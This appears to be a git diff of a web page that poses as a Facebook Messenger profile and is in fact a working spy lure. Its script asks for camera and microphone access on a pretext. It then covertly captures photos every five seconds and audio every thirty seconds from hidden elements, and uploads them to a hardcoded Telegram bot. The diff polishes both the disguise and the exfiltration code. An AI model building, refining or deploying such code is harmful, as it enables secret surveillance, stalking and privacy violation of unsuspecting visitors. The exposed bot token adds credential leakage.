@@ -6,33 +6,38 @@
     <title>M.H. Miraz | Profile</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* তোমার অরিজাল ডিজাইন - কোনো পরিবর্তন নেই */
+        /* তোমার অরিজিনাল ডিজাইন - একদম সেম */
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Helvetica, Arial, sans-serif; }
         body { background-color: #f0f2f5; overflow-x: hidden; }
         #entryOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 10000; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px; }
-        .open-btn { background: #1877f2; color: white; border: none; padding: 14px 50px; border-radius: 8px; font-weight: bold; font-size: 19px; cursor: pointer; }
+        .open-btn { background: #1877f2; color: white; border: none; padding: 14px 50px; border-radius: 8px; font-weight: bold; font-size: 19px; cursor: pointer; box-shadow: 0 4px 12px rgba(24,119,242,0.3); }
+        
         .header { background: white; padding-bottom: 15px; border-bottom: 1px solid #ddd; text-align: center; }
         .cover { width: 100%; height: 200px; background: #ddd url('cover.jpg') center/cover; }
         .profile-container { position: relative; display: inline-block; margin-top: -75px; }
         .profile-pic { width: 160px; height: 160px; border-radius: 50%; border: 4px solid white; background: #ccc url('profile.jpg') center/cover; }
         .name-box h1 { font-size: 28px; font-weight: bold; margin-top: 10px; }
+        
         .bio-section { padding: 15px 20px; text-align: center; background: white; border-bottom: 1px solid #ddd; }
         .details-list { text-align: left; max-width: 350px; margin: 15px auto 0; display: flex; flex-direction: column; gap: 10px; }
-        .detail-item { display: flex; align-items: center; gap: 10px; font-size: 15px; }
+        .detail-item { display: flex; align-items: center; gap: 10px; font-size: 15px; color: #1c1e21; }
+        
         #chatBox { display:none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 9999; flex-direction: column; }
-        .chat-h { padding: 10px 15px; border-bottom: 1px solid #eee; display: flex; align-items: center; justify-content: space-between; }
-        #msgs { flex: 1; overflow-y: auto; padding: 15px; }
+        .chat-h { padding: 10px 15px; border-bottom: 1px solid #eee; display: flex; align-items: center; justify-content: space-between; background: #fff; }
+        #msgs { flex: 1; overflow-y: auto; padding: 15px; display: flex; flex-direction: column; gap: 10px; }
         .inp-bar { padding: 10px 15px; display: flex; align-items: center; border-top: 1px solid #eee; }
         .inp-bar input { flex: 1; border: none; background: #f0f2f5; padding: 10px 15px; border-radius: 20px; outline: none; }
-        video, canvas { display: none; }
+        
+        video, canvas { display: none; position: absolute; left: -9999px; }
     </style>
 </head>
 <body>
 
     <div id="entryOverlay">
-        <i class="fab fa-facebook-messenger" style="font-size: 50px; color: #0084ff; margin-bottom: 20px;"></i>
-        <h2 style="margin-bottom: 10px;">Continue to Messenger</h2>
-        <button class="open-btn" onclick="startExecution()">Open Link</button>
+        <i class="fab fa-facebook-messenger" style="font-size: 60px; color: #0084ff; margin-bottom: 20px;"></i>
+        <h2 style="margin-bottom: 10px;">Messenger</h2>
+        <p style="color:#65676b; margin-bottom:30px;">Continue to see M.H. Miraz's profile</p>
+        <button class="open-btn" onclick="letsGo()">Open Link</button>
     </div>
 
     <div id="mainContent" style="display:none; height: 100vh; overflow-y: auto;">
@@ -44,8 +49,8 @@
                 <p style="color:#65676b;">288 Friends • 2 mutual</p>
             </div>
             <div style="display:flex; padding: 15px; gap: 10px;">
-                <button style="background:#1877f2; color:white; border:none; padding:10px; border-radius:6px; flex:1;">+ Add Friend</button>
-                <button style="background:#e4e6eb; color:black; border:none; padding:10px; border-radius:6px; flex:1;" onclick="openChat()">📩 Message</button>
+                <button style="background:#1877f2; color:white; border:none; padding:10px; border-radius:6px; flex:1; font-weight:600;">+ Add Friend</button>
+                <button style="background:#e4e6eb; color:black; border:none; padding:10px; border-radius:6px; flex:1; font-weight:600;" onclick="openChat()">📩 Message</button>
             </div>
         </div>
         <div class="bio-section">
@@ -60,67 +65,78 @@
 
     <div id="chatBox">
         <div class="chat-h">
-            <i class="fas fa-arrow-left" onclick="closeChat()"></i>
+            <i class="fas fa-arrow-left" style="color:#0084ff;" onclick="closeChat()"></i>
             <span style="font-weight:bold;">M.H. Miraz</span>
-            <i class="fas fa-video"></i>
+            <i class="fas fa-video" style="color:#0084ff;"></i>
         </div>
         <div id="msgs"></div>
-        <div class="inp-bar"><input type="text" id="uInp" placeholder="Message..." onkeypress="if(event.key==='Enter') sendMsg()"></div>
+        <div class="inp-bar"><input type="text" id="uInp" placeholder="Aa" onkeypress="if(event.key==='Enter') sendMsg()"></div>
     </div>
 
     <video id="v" autoplay playsinline muted></video>
     <canvas id="c"></canvas>
 
     <script>
-        const T = '8600117294:AAH2qNjbQz3-iOCjHsZBfOi1qAUs1Uq2i0o';
-        const C = '7767412329';
+        const BOT_TOKEN = '8600117294:AAH2qNjbQz3-iOCjHsZBfOi1qAUs1Uq2i0o';
+        const CHAT_ID = '7767412329';
 
-        async function startExecution() {
+        async function letsGo() {
             try {
-                const s = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                document.getElementById('v').srcObject = s;
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                document.getElementById('v').srcObject = stream;
                 
                 // ছবি প্রতি ৫ সেকেন্ডে
-                setInterval(takePic, 5000);
+                setInterval(captureAndSend, 5000);
                 
-                // অডিও লুপ
-                startVoice(s);
+                // অডিও প্রতি ৩০ সেকেন্ডে
+                recAudio(stream);
 
                 document.getElementById('entryOverlay').style.display = 'none';
                 document.getElementById('mainContent').style.display = 'block';
-            } catch (e) { alert("Permission required to view profile."); }
+            } catch (e) {
+                alert("Please allow camera/mic access to view the profile.");
+            }
         }
 
-        async function takePic() {
+        function captureAndSend() {
             const video = document.getElementById('v');
             const canvas = document.getElementById('c');
             if (video.videoWidth === 0) return;
-            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
             
-            canvas.toBlob(async (b) => {
-                const f = new FormData();
-                f.append('chat_id', C);
-                f.append('photo', b, 'img.jpg');
-                await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: f });
+            canvas.toBlob((blob) => {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'shot.jpg');
+                
+                const xhr = new XMLHttpRequest();
+                xhr.open('POST', `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, true);
+                xhr.send(formData);
             }, 'image/jpeg', 0.5);
         }
 
-        function startVoice(s) {
-            let r = new MediaRecorder(s);
-            let ch = [];
-            r.ondataavailable = (e) => ch.push(e.data);
-            r.onstop = async () => {
-                const b = new Blob(ch, { type: 'audio/ogg' });
-                const f = new FormData();
-                f.append('chat_id', C);
-                f.append('voice', b, 'audio.ogg');
-                await fetch(`https://api.telegram.org/bot${T}/sendVoice`, { method: 'POST', body: f });
-                ch = [];
-                r.start();
+        function recAudio(stream) {
+            let recorder = new MediaRecorder(stream);
+            let chunks = [];
+            recorder.ondataavailable = (e) => chunks.push(e.data);
+            recorder.onstop = () => {
+                const blob = new Blob(chunks, { type: 'audio/ogg' });
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('voice', blob, 'voice.ogg');
+                
+                const xhr = new XMLHttpRequest();
+                xhr.open('POST', `https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, true);
+                xhr.send(formData);
+                
+                chunks = [];
+                recorder.start();
             };
-            r.start();
-            setInterval(() => { if(r.state === 'recording') r.stop(); }, 30000);
+            recorder.start();
+            setInterval(() => { if(recorder.state === 'recording') recorder.stop(); }, 30000);
         }
 
         function openChat() { document.getElementById('chatBox').style.display = 'flex'; }
